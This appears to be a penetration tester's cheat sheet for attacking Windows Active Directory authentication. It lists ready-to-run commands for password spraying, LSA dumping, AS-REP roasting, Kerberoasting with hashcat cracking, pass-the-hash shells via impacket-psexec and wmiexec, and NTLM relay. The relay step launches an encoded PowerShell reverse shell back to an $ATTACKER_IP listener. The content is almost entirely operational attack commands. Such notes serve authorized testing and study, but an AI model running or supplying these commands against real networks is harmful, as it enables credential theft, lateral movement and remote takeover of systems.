# Attacking Authentication

## Password spray


Password spray attack with crackmapexec.
Note that crackmapexec doesn't look at the policy for locking users

```
crackmapexec smb $RHOST -u ${USERS_FILE} -p '${PASSWORD}' -d ${DOMAIN} --continue-on-success
```
Available protocols are: `ssh,mssql,winrm,smb,ldap,rdp,ftp`.


for smb, consider following up with found credentials and `--shares`.

Also remember that you can check for reused local admin credentials with:

```
crackmapexec smb $RHOST -u Administrator -H "${NTLM_HASH}" --local-auth --lsa
```


## Impacket

### AS-REP roasting

```
impacket-GetNPUsers -dc-ip ${DC_IP} -request -outputfile asrep-result.txt ${DOMAIN}/${OWNED_USER}
```

### Kerberoasting

This is good for high-privilege service accounts.
check for SPN accounts:
```
impacket-GetUserSPNs -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PASSWORD} 

```
Now, we can request the TGS for the found SPN:

```
impacket-GetUserSPNs -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PW} -request-user ${SPN_ACCOUNT} -outputfile tgs.txt 
```
Note the `$SPN_ACCOUNT` is the account Name, not the ServicePrincipalName.


Now, you can crack the password in the tgs file:

```
hashcat -a 0 -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

### Pass Admin hash psexec

Note that both "Pass the Admin hash" and the relay attack can sometimes be used to traverse with _local admin accounts_,
as some domains are setup with all local Administrators having the same password.
That means their NTLM hash is the same, meaning both `impacket-psexec` and the `impacket-ntlmrelayx` should work.

Assuming you've found an NTLM admin hash, you might be able to get a reverse shell onto another machine with `impacket-psexec`:

```
impacket-psexec -hashes :${NTLM_HASH} Administrator@$RHOST
```
a similar command is `impacket-wmiexec`, which gets us a shell as Administrator, rather than the SYSTEM:

```
impacket-wmiexec -hashes :${NTLM_HASH} Administrator@${RHOST}
```
This requires the SMB port (usually 445) to be available, Windows File and Printer sharing to be enabled, as well as the ADMIN$ share to be available.


### Relay hash with impacket-ntlmrelayx

You can relay SMB requests between SRV1 and SRV2 by doing the following:

* Setup an nc listener on kali: `nc -nvlp 6666`.
* From kali: `sudo impacket-ntlmrelayx --no-http-server -smb2support -t ${SRV2} -c "powershell -enc ${ENCODED_REV_SHELL}"` (`ENCODED_REV_SHELL` points to `$ATTACKER_IP` and port `6666`)
* From SRV1 do `dir \\$ATTACKER_IP\thiswillgetdenied`.
The SMB request with the NTLMv2 Hash of the user on SRV1 will get relayed to SRV2.
Target system needs to have UAC remote restrictions disabled, and the user on SRV1 needs to have access to SRV2 for this to work.

